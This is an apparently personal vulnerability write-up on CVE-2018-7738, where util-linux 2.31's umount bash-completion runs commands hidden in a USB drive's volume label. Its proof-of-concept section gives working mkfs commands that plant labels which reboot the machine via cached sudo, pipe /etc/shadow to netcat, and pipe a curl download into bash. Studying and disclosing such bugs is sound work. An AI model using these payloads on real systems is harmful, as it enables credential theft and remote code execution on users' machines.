Malicious Command Execution via bash-completion
 or
CVE-2018-7738


Overview:
I was playing around with USB stick names when I saw something odd happen. I
had named a drive `ID` by accident, and when I went to umount the drive I saw:

$ umount /dev/s<tab>ID: command not found
ID: command not found

Something had obviously gone wrong here. After trying again I realized that the
command was being executed when I hit the <tab> key to bring up the list of
valid devices (such as /dev/sdb1).

After digging around in the OS I found that the umount bash-completion script
is allowing drive names with `` or $() to be executed by line 44:

$ sed -n 44,45p /usr/share/bash-completion/completions/umount
    DEVS_MPOINTS="$(mount | awk '{print $1, $3}')"
    COMPREPLY=( $(compgen -W "$DEVS_MPOINTS" -- $cur) )

This type of problem isn't new of course, earlier in the year there was a KDE
bug that allowed commands on USB drives to be executed when the drive is
inserted, obviously a much more severe issue:
https://www.kde.org/info/security/advisory-20180208-2.txt


Proof of Concept:
I found this bug by trying to execute an invalid command, because the tool I
used to create the FAT32 partition defaulted to the DOS standard of using upper
case. But if you use the mkfs.fat tool it won't force it to be capitalized:

$ sudo mkfs.fat -I -n '`id`' /dev/sdb1

But when I tried this I found that I no feedback at all when hitting <tab>.
After some confusion I realized this is because the command had run, but
because it had run successfully the output of the command was discarded.

FAT32 volume names are limited to 11 characters, so to have fun we need to try
another filesystem type such as NTFS. Also, when mounting and unmounting
partitions it is likely that a user will have sudo credentials already cached,
which makes this an excellent chance to create a joke USB stick for use around
the office:

$ sudo mkfs.ntfs -f -L '`IFS=,;a=sudo,reboot;\$a`' /dev/sdb1

This is good for some laughs, but it's not a very 1337. So let's try an example
that more interesting. Create your malicious USB drive:

$ sudo mkfs.ntfs -f -L '`IFS=,;sudo,cat,/etc/shadow,|,nc,127.0.0.1,31337;\$a`' /dev/sdb1

Run this command in a terminal on the same computer you are going to try this
PoC on:

$ nc -l 127.0.0.1 31337

Then insert the USB stick into the computer, type the umount command and hit
tab. If you have cached sudo credentials in your terminal you should see the
contents of your /etc/shadow file show up in another terminal with no
indication that anything bad happened.

Or! Let's have some fun!

$ sudo mkfs.ntfs -f -L '`IFS=,;a=curl,-Ls,notmalware.sh;\$a|bash`' /dev/sdb1


Finding the Root Cause:
The version of the umount bash-completion script found in the Ubuntu Bionic
git repo:
https://git.launchpad.net/ubuntu/+source/bash-completion/tree/completions/umount?h=ubuntu/bionic

Matches the version in the upstream github repo:
https://github.com/scop/bash-completion/blob/master/completions/_umount

Neither of those files match what I have in my install. After some digging 
around I see that the changelog for the bash-completion package in Ubuntu 18.04
indicates they stopped shipping the completion scripts from bash-completion for
the mount and umount utilities. Rather they were using the completion scripts
provided by the util-linux package.
http://changelogs.ubuntu.com/changelogs/pool/main/b/bash-completion/bash-completion_2.8-1ubuntu1/changelog

Looking at the util-linux package listing for Ubuntu 18.04 shows they are
shipping util-linux 2.31:
https://packages.ubuntu.com/bionic/util-linux

And util-linux verison 2.31 does have the code causing the problem:
https://github.com/karelzak/util-linux/blob/stable/v2.31/bash-completion/umount#L44

It appears to be fixed in the next revision of util-linux.
https://github.com/karelzak/util-linux/blob/stable/v2.32/bash-completion/umount#L44

You can see this bug goes back a while on Ubuntu: 
https://git.launchpad.net/ubuntu/+source/util-linux/commit/bash-completion/umount?h=applied/ubuntu/bionic&id=0036b080916d422aad4e352ee25402f336d15348

But because this particular file was overwritten by the installation of the
bash-completion version, the affects weren't seen until recently.

A little more searching and I found this has already been reported as a
security issue as CVE-2018-7738:
https://www.cvedetails.com/cve/CVE-2018-7738/

So someone already found this particular bug.


Other Bugs?:
If there was a bug in one bash-completion script, why not others?  Searching for
dollar signs embedded in strings in bash-completion scripts there are 2 tools
that looked worth further investigation: hcitool and iwconfig.


hcitool:
Some quick experimentation showed that hcitool (and the other hci* utilties) are
not vulnerable to this same issue.

$ head -n9 /usr/share/bash-completion/completions/hcitool 
# bash completion for bluez utils                          -*- shell-script -*-

_bluetooth_addresses()
{
    if [[ -n ${COMP_BLUETOOTH_SCAN:-} ]]; then
        COMPREPLY+=( $( compgen -W "$( hcitool scan | \
        awk '/^\t/{print $1}' )" -- "$cur" ) )
    fi
}

This script does a very similar thing by embedding the results of an awk
command in "", but because the it only grabs the first column of output the
name reported by the device is not interpreted by "".


iwconfig:
Testing showed that iwconfig wasn't vulnerable to this type of problem either,
which was too bad because it would have been much more fun. But the reason is
much weirder than hcitool.

My first glance at the case for generating a list of completion strings for an
essid (or ap) looks like this technique should work perfectly:

$ sed -n 14,22p /usr/share/bash-completion/completions/iwconfig 
        essid)
        	COMPREPLY=( $( compgen -W 'on off any' -- "$cur" ) )
            if [[ -n ${COMP_IWLIST_SCAN:-} ]]; then
            	COMPREPLY+=( $( compgen -W \
                	"$( iwlist ${words[1]} scan | \
                	awk -F'\"' '/ESSID/ {print $2}' )" -- "$cur" ) )
            fi
            return
            ;;

But after some testing it became obvious that this doesn't work because the
COMP_IWLIST_SCAN variable is not defined. And I can't find anything that
_should_ define it. A google search only comes up with various bash-completion
sources. A journey through git-blame in the bash-completion repo shows that this
variable was introduced over 13 years ago:
https://github.com/scop/bash-completion/commit/fa7a4bcaeab1c583d25dd70404157e14024f58c3

And as near as I can determine this particular functionality has never worked as
intended.


Lesson:
What is the lesson from all of this?  The lesson is that operating systems such
as Linux are held together with a terrifying amount of old shell scripts. Many
of these scripts have bugs, many of them have unintended consequences because
of the complex feature set of interpreters like bash.

Helper scripts that you put in your .bashrc or .bash_profile can make living on
the CLI much nicer, but there is a cost as well. This is also a reminder about
why root accounts shouldn't use these scripts.


Affected Versions:
Ubuntu 18.04
Any other OS that uses the util-linux 2.31 bash-completion mount/umount
scripts, a full analysis of which Linux distributions use this package was not
done.

